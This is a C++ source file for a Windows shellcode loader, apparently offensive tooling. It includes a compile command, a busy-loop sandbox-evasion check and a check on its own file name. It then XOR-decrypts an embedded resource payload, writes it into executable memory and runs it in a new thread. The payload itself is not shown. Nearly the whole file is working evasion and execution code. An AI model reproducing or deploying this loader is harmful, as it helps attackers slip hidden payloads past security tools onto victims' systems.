// Compile: clang++.exe -O2 -Ob2 -Os -fno-stack-protector -g -Xlinker -pdb:none -Xlinker -subsystem:console -o Caue.exe Caue.cpp metadata.res -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <regex>

#define SHELLCODE_RESOURCE 101
#define MAX_OP 89888996

void shellcode();

using namespace std;

int main(int argc, char* argv[]) 
{
	// Simple sanbox evasion
	char path[MAX_PATH];
    	int cpt = 0;
    	int i = 0;
	for (i = 0; i < MAX_OP; i++) 
	{
		cpt++;
	}

	if (cpt == MAX_OP)
	{
		GetModuleFileName(NULL, path, MAX_PATH);
		regex str_expr("(.*)(Caue)(.*)");
		// Check if the file path matches the regular expression pattern
		if (regex_match(path, str_expr)) 
		{			
			shellcode();
		}
	}
	return 0;
}


void shellcode() {
	// Load shellcode from resources
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(SHELLCODE_RESOURCE), RT_RCDATA);
	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	printf("[+] Resource size: %lu bytes\n", (unsigned long)shellcodeSize);
	
	// Copy the shellcode to a modifiable buffer
	char* dataCopy = new char[shellcodeSize];
	memcpy(dataCopy, LockResource(shellcodeResourceData), shellcodeSize);
	
	// XOR Decrypt the shellcode
	char key[] = "ABCD";
	int j = 0;
	for (int i = 0; i < shellcodeSize; i++) 
	{
		if (j == sizeof(key) - 1) j = 0;
		dataCopy[i] = dataCopy[i] ^ key[j];
		j++;
	}
	
	// Get the ID of the current process
	DWORD pnameid = GetCurrentProcessId(); 
	
	// Open the current process with all access rights
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);
	
	// Allocate memory the size of the shellcode
	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
	// Write the shellcode to the remote buffer
	WriteProcessMemory(processHandle, remoteBuffer, dataCopy, shellcodeSize, NULL);
	
	// Create a remote thread
	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	
	// Cleanup
	CloseHandle(processHandle);
	delete[] dataCopy;

	system("pause");
}
